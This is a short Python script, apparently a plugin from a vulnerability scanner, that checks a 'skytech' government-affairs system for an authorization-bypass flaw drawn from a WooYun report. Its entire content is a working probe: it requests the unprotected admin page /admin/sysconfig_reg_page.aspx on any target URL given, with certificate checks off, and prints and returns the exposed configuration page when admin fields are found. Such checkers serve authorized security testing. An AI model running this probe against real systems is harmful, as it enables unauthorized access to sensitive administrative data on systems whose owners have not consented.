#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: skytech政务系统越权漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-081902
author: Lucifer
description: skytech政务系统越权漏洞,泄露敏感信息。
'''
import sys
import requests
import warnings
from termcolor import cprint

class skytech_bypass_priv_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/admin/sysconfig_reg_page.aspx"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)
            if r"txtUserRights" in req.text and r"txtTitle" in req.text:
                cprint("[+]存在skytech政务系统越权漏洞...(敏感信息)\tpayload: "+vulnurl, "green")
                return True, vulnurl, "skytech政务系统越权漏洞", payload, req.text
            else:
                cprint("[-]不存在skytech_bypass_priv漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = skytech_bypass_priv_BaseVerify(sys.argv[1])
    testVuln.run()
